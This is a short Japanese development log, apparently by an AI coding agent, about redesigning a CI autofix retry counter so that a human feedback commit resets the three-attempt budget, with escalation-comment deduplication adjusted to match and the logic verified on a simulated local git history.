- PR #39はautofixの3回を使い切ってもなお失敗し、エスカレーションコメント。ユーザーがfeedbackループ（PRコメント）で1回手を入れたが、それでも直らず「毎回コメントするのはオーバーヘッドが大きい」との指摘があった
- 最初に提案したのは「autofixの上限（3回）をグローバルに引き上げる」案だったが、ユーザーから「試行回数カウンター自体をリセットできないか」という逆提案があり、こちらの方が設計として筋が良いと判断した
- 採用した設計：試行回数を`origin/main..HEAD`全体のAI-Autofix-Attemptコミット数ではなく、**HEADから遡って連続しているAI-Autofix-Attemptコミットの数だけ**を数えるように変更。人間がfeedbackループを起動すると（トレーラーを持たないコミットが積まれる）、そこで自然にカウントがリセットされる——「人間が一度見て手を入れた」こと自体を、新しい3回分の試行予算を与える明示的な合図として扱う設計にした
- 副作用として、エスカレーションコメントの重複排除（直前に直した設計漏れ）も「今回のリセット以降に限定」する形に合わせて修正する必要があった。そうしないと、リセット後に再び3回使い切っても、古いサイクルのコメントのせいで新しい通知が永久に出なくなってしまう
- この開発環境には`gh`も実際のPR操作手段もないため、カウントロジック自体はローカルでgitリポジトリを作って擬似的なコミット履歴を再現し、2パターン（feedbackリセットあり・なし）で動作を検証してから採用した
- **教訓**：ユーザーからの「カウンターをリセットできないか」という一言が、こちらが最初に出した「上限を上げる」という安易な案より良い設計を引き出した。グローバルな閾値変更は常に「全PRへの影響」という副作用を伴うが、人間の介入を起点にしたリセットは、安全設計（人間レビューが実質的な防御線）の思想とも自然に整合する
